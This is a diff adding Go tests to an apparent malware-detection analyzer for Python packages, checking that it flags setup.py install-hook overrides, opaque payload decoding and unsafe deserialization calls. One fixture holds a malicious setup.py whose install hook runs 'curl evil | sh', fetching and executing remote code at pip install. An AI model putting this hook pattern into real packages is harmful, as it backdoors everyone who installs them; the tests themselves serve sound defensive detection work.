@@ -103,6 +103,106 @@ func TestAnalyzer_Analyze_DynamicEvalIsBareBuiltinOnly(t *testing.T) {
 		"only bare exec / compile / __import__ — not re.compile or .eval()")
 }
 
+// TestAnalyzer_Analyze_SetupPyInstallHook: the most iconic PyPI
+// vector — a setup.py that subclasses a setuptools/distutils install
+// command so arbitrary code runs at `pip install`. The payload is in
+// a method body, invisible to import-time call counting; the
+// structural tell is the command-class subclass in setup.py.
+func TestAnalyzer_Analyze_SetupPyInstallHook(t *testing.T) {
+	t.Parallel()
+	malicious := "" +
+		"from setuptools import setup\n" +
+		"from setuptools.command.install import install\n" +
+		"import os\n" +
+		"class _PostInstall(install):\n" +
+		"    def run(self):\n" +
+		"        os.system('curl evil | sh')\n" +
+		"        install.run(self)\n" +
+		"setup(name='x', cmdclass={'install': _PostInstall})\n"
+
+	t.Run("flags in setup.py", func(t *testing.T) {
+		t.Parallel()
+		a := NewAnalyzer()
+		c, err := a.Analyze(t.Context(), seq(
+			fe{f: astfeature.SourceFile{Path: "setup.py", Content: []byte(malicious)}},
+		))
+		require.NoError(t, err)
+		assert.Equal(t, 1, c.InstallHookOverrides,
+			"a command-class subclass in setup.py is an install-time hook")
+	})
+
+	t.Run("ignored outside setup.py", func(t *testing.T) {
+		t.Parallel()
+		a := NewAnalyzer()
+		c, err := a.Analyze(t.Context(), seq(
+			fe{f: astfeature.SourceFile{Path: "pkg/cli.py", Content: []byte(malicious)}},
+		))
+		require.NoError(t, err)
+		assert.Equal(t, 0, c.InstallHookOverrides,
+			"subclassing install outside setup.py is not the install-hook vector")
+	})
+
+	t.Run("benign declarative setup.py", func(t *testing.T) {
+		t.Parallel()
+		a := NewAnalyzer()
+		c, err := a.Analyze(t.Context(), seq(
+			fe{f: astfeature.SourceFile{Path: "setup.py", Content: []byte(
+				"from setuptools import setup, find_packages\n" +
+					"setup(name='x', packages=find_packages())\n")}},
+		))
+		require.NoError(t, err)
+		assert.Equal(t, 0, c.InstallHookOverrides,
+			"an ordinary declarative setup.py must not flag")
+	})
+}
+
+// TestAnalyzer_Analyze_PayloadDecodeCatalog: obfuscated payloads
+// arrive hex- or zlib/lzma/gzip-compressed as often as base64. The
+// Base64DecodeCalls field is "opaque payload decode" by intent —
+// broaden it. json.dumps / plain str ops must not count.
+func TestAnalyzer_Analyze_PayloadDecodeCatalog(t *testing.T) {
+	t.Parallel()
+	src := "" +
+		"import binascii, zlib, lzma, gzip, json\n" +
+		"binascii.unhexlify(p)\n" +
+		"bytes.fromhex(p)\n" +
+		"zlib.decompress(p)\n" +
+		"lzma.decompress(p)\n" +
+		"gzip.decompress(p)\n" +
+		"json.dumps(p)\n" // benign
+	a := NewAnalyzer()
+	counts, err := a.Analyze(t.Context(), seq(
+		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
+	))
+	require.NoError(t, err)
+	assert.Equal(t, 5, counts.Base64DecodeCalls,
+		"unhexlify + fromhex + zlib/lzma/gzip.decompress — json.dumps must not")
+}
+
+// TestAnalyzer_Analyze_DeserializationSinks: pickle/marshal/dill
+// loads and yaml.load(without SafeLoader) are arbitrary-code-
+// execution on untrusted data — the same code-from-data threat
+// class as exec, so they fold into DynamicEvalCalls. json.loads and
+// yaml.safe_load are benign and must not count.
+func TestAnalyzer_Analyze_DeserializationSinks(t *testing.T) {
+	t.Parallel()
+	src := "" +
+		"import pickle, marshal, json, yaml\n" +
+		"pickle.loads(blob)\n" + // RCE
+		"marshal.loads(blob)\n" + // RCE
+		"yaml.load(text)\n" + // RCE (no SafeLoader)
+		"json.loads(text)\n" + // benign
+		"yaml.safe_load(text)\n" + // benign
+		"obj.loads(x)\n" // benign (arbitrary method named loads)
+	a := NewAnalyzer()
+	counts, err := a.Analyze(t.Context(), seq(
+		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
+	))
+	require.NoError(t, err)
+	assert.Equal(t, 3, counts.DynamicEvalCalls,
+		"pickle.loads + marshal.loads + yaml.load — json.loads, yaml.safe_load, obj.loads must not")
+}
+
 // TestAnalyzer_Analyze_CredentialHarvest is the adversarial fixture
 // for the dominant *modern* PyPI payload class: reading SSH keys,
 // cloud credentials, and .netrc for exfil. Only resolvable sensitive
